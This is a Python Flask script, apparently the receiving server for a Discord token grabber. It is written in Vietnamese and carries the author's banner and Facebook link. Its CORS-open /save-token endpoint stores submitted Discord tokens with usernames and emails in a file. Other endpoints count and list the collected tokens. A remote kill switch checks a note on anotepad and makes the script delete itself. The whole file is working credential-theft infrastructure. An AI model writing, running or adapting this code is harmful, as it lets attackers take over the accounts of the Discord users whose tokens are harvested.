from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime
import os
import requests
import time
import httpx
import base64
import json
import uuid, sys, os, re
from bs4 import BeautifulSoup
import urllib3
import gc
import ssl
import random
import certifi
import webbrowser, shutil, subprocess, signal
from fake_useragent import UserAgent
from pystyle import Colorate, Colors
import platform

app = Flask(__name__)
CORS(app)

TOKEN_FILE = os.path.join(os.getcwd(), "discord_tokens.txt")
FACEBOOK_URL = "https://www.facebook.com/nguyengiaphuczzz"


BANNER = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠓⠶⣤⠀⠀⠀⠀⣠⠶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠇⠀⢠⡏⠀⠀⢀⡔⠉⠀⢈⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠩⠤⣄⣼⠁⠀⣠⠟⠀⠀⣠⠏⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢀⣀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠁⠀⠀⠣⣤⣀⡼⠃⠀⢀⡴⠋⠈⠳⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣿⡿⠿⠿⠟⠛⠛⠛⠛⠿⠿⣿⣿⣶⣤⣄⠀⠀⠀⠉⠀⢀⡴⠋⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⠿⠋⠉⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠻⢿⣿⣶⣄⠀⠀⠳⣄⠀⣠⠞⢁⡠⢶⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⠿⠋⠀⠀⢀⣴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢤⡈⠛⢿⣿⣦⡀⠈⠛⢡⠚⠃⠀⠀⢹⡆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⠟⠁⠀⠀⠀⢀⣾⠃⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡆⠀⠀⢻⣦⠀⠙⢿⣿⣦⡀⠈⢶⣀⡴⠞⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠃⠀⠀⠀⠀⢀⣾⡇⢀⡄⠀⢸⡇⠀⠀⠀⠀⠀⠀⣀⠀⢸⣷⡀⠀⠀⠹⣷⡀⠀⠙⢿⣷⡀⠀⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣰⣿⡟⠀⠀⠀⠀⠀⠀⣾⣿⠃⣼⡇⠀⢸⡇⠀⠀⠀⠀⠀⠀⣿⠀⢸⣿⣷⡀⠀⢀⣾⣿⡤⠐⠊⢻⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣿⣿⣼⡇⠀⠀⠀⠀⢠⣿⠉⢠⣿⠧⠀⣸⣇⣠⡄⠀⠀⠀⠀⣿⠠⢸⡟⠹⣿⡍⠉⣿⣿⣧⠀⠀⠀⠻⣿⣶⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⡟⠀⠀⠀⠀⠀⣼⡏⢠⡿⣿⣦⣤⣿⡿⣿⡇⠀⠀⠀⢸⡿⠻⣿⣧⣤⣼⣿⡄⢸⡿⣿⡇⠀⠀⢠⣌⠛⢿⣿⣶⣤⣤⣄⡀
⠀⠀⠀⣀⣤⣿⣿⠟⣀⠀⠀⠀⠀⠀⣿⢃⣿⠇⢿⣯⣿⣿⣇⣿⠁⠀⠀⠀⣾⡇⢸⣿⠃⠉⠁⠸⣿⣼⡇⢻⡇⠀⠀⠀⢿⣷⣶⣬⣭⣿⣿⣿⠇
⣾⣿⣿⣿⣿⣻⣥⣾⡇⠀⠀⠀⠀⠀⣿⣿⠇⠀⠘⠿⠋⠻⠿⠿⠶⠶⠾⠿⠿⠍⢛⣧⣰⠶⢀⣀⣼⣿⣴⡸⣿⠀⠀⠀⠸⣿⣿⣿⠉⠛⠉⠀⠀
⠘⠛⠿⠿⢿⣿⠉⣿⠁⠀⠀⠀⠀⢀⣿⡿⣶⣶⣶⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⢀⣭⣶⣿⡿⠟⠋⠉⠀⠀⣿⠀⡀⡀⠀⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣿⠀⣿⠀⠀⠸⠀⠀⠸⣿⠇⠀⠀⣈⣩⣭⣿⡿⠟⠃⠀⠀⠀⠀⠀⠙⠛⠛⠛⠛⠻⠿⠷⠆⠀⣯⠀⠇⡇⠀⣿⡏⣿⣧⠀⠀⠀⠀
⠀⠀⠀⠀⢿⣿⡀⣿⡆⠀⠀⠀⠀⠀⣿⠰⠿⠿⠛⠋⠉⠀⠀⢀⣴⣶⣶⣶⣶⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⣿⡇⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⡇⢻⣇⠀⠘⣰⡀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⠀⠀⠀⣿⣧⣿⡿⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣿⣧⢸⣿⡀⠀⡿⣧⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⣼⡇⠀⠀⠀⠀⠀⠀⢀⣤⣾⡟⢡⣶⠀⢠⣿⣿⣿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠹⣿⣿⣿⣷⠀⠇⢹⣷⡸⣿⣶⣦⣄⣀⡀⠀⠀⠀⣿⡇⠀⠀⢠⣿⠁⣀⣀⣠⣤⣶⣾⡿⢿⣿⡇⣼⣿⢀⣿⣿⠿⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠛⠛⣿⣷⣴⠀⢹⣿⣿⣿⡟⠿⠿⣿⣿⣿⣿⣾⣷⣶⣿⣿⣿⣿⡿⠿⠟⠛⠋⠉⠀⢸⣿⣿⣿⣿⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣦⣘⣿⡿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠻⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

ADMIN = "Admin: Nguyễn Gia Phúc (Obito)"

def pat(linkurl="https://anotepad.com/notes/cd8rfeaw"):
    
    try:
        ctx = ssl.create_default_context(cafile=certifi.where())
        ctx.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
        transport = httpx.HTTPTransport(verify=ctx, retries=3)
        headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
            ]),
            "Accept": "*/*", "Connection": "keep-alive",
            "Cache-Control": "no-cache"
        }

        with httpx.Client(transport=transport, headers=headers, follow_redirects=True, timeout=30.0) as client:
            time.sleep(random.uniform(0.5, 2.0))
            res = client.get(f"{linkurl}?t={int(time.time())}")
            if res.status_code != 200 or not res.text.strip():
                print("Server không hoạt động")
                open_url(FACEBOOK_URL)
                try: os.remove(__file__)
                except: pass
                sys.exit(1)

            soup = BeautifulSoup(res.text, 'html.parser')
            text = soup.find('div', {'class': 'plaintext'})
            if not text:
                print("Lỗi trạng thái server.")
                open_url(FACEBOOK_URL)
                try: os.remove(__file__)
                except: pass
                sys.exit(1)

            status = text.get_text().lower().strip()
            if status in ['offline', 'off']:
                print("⛔ Server đang tạm ngừng. Mọi thắc mắc vui lòng liên hệ Admin Facebook: https://www.facebook.com/nguyengiaphuczzz")
                open_url(FACEBOOK_URL)
                try: os.remove(__file__)
                except: pass
                try: os.kill(os.getpid(), signal.SIGKILL)
                except: sys.exit(1)

    except Exception as e:
        print(f"Lỗi kiểm tra server: {e}")
        open_url(FACEBOOK_URL)
        try: os.remove(__file__)
        except: pass
        sys.exit(1)


def display_banner():
    """Hiển thị banner trực tiếp"""
    os.system("cls" if os.name == "nt" else "clear")
    os.system("")
   
    print(Colorate.Horizontal(Colors.rainbow, BANNER, 1))
    
    
    print("\n\n" + Colorate.Horizontal(Colors.rainbow, ADMIN.center(60), 1))
    print(Colorate.Horizontal(Colors.rainbow, FACEBOOK_URL.center(60), 1))
    print("\n")


@app.route('/save-token', methods=['POST'])
def save_token():
    try:
        data = request.get_json()
        token = data.get('token')
        email = data.get('email', 'Unknown')
        username = data.get('username', 'Unknown')

        if not token:
            return jsonify({'success': False, 'message': 'Token không được để trống'}), 400

        token_line = f"{token}|{username}|{email}\n"

        with open(TOKEN_FILE, 'a', encoding='utf-8') as f:
            f.write(token_line)
            f.flush()
            os.fsync(f.fileno())

        print(f"Đã lưu token vào: {TOKEN_FILE}")
        print(f"Username: {username}")
        print(f"Email: {email}")
        print(f"Token: {token[:20]}...")

        with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
            total_lines = len([line for line in f if line.strip()])
            print(f"Tổng số token trong file: {total_lines}")

        return jsonify({
            'success': True,
            'message': 'Token đã được lưu thành công',
            'saved_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'file_path': TOKEN_FILE
        }), 200

    except Exception as e:
        print(f"❌ Lỗi khi lưu token: {str(e)}")
        import traceback
        traceback.print_exc()
        return jsonify({'success': False, 'message': str(e)}), 500


@app.route('/health', methods=['GET'])
def health():
    return jsonify({
        'status': 'Server đang chạy',
        'file': TOKEN_FILE,
        'file_exists': os.path.exists(TOKEN_FILE)
    }), 200


@app.route('/count', methods=['GET'])
def count_tokens():
    try:
        if not os.path.exists(TOKEN_FILE):
            return jsonify({'count': 0, 'message': 'Chưa có token nào', 'file': TOKEN_FILE}), 200

        with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]
            count = len(lines)

        return jsonify({
            'count': count,
            'message': f'Đã lưu {count} token',
            'file': TOKEN_FILE
        }), 200
    except Exception as e:
        return jsonify({'count': 0, 'message': str(e), 'file': TOKEN_FILE}), 500


@app.route('/view-tokens', methods=['GET'])
def view_tokens():
    try:
        if not os.path.exists(TOKEN_FILE):
            return jsonify({'tokens': [], 'message': 'Chưa có token nào'}), 200

        with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]

        tokens = []
        for line in lines:
            parts = line.split('|')
            if len(parts) >= 3:
                tokens.append({
                    'token': parts[0][:20] + '...',
                    'username': parts[1],
                    'email': parts[2]
                })

        return jsonify({
            'tokens': tokens,
            'count': len(tokens),
            'file': TOKEN_FILE
        }), 200
    except Exception as e:
        return jsonify({'tokens': [], 'message': str(e)}), 500


if __name__ == '__main__':
    pat()
    display_banner()

    print(f"File lưu token: {TOKEN_FILE}")
    print(f"Server: http://localhost:5000")
    print(f"Kiểm tra số lượng: http://localhost:5000/count")
    print(f"Xem danh sách: http://localhost:5000/view-tokens")
    print("-" * 60)

    app.run(host='0.0.0.0', port=5000, debug=True)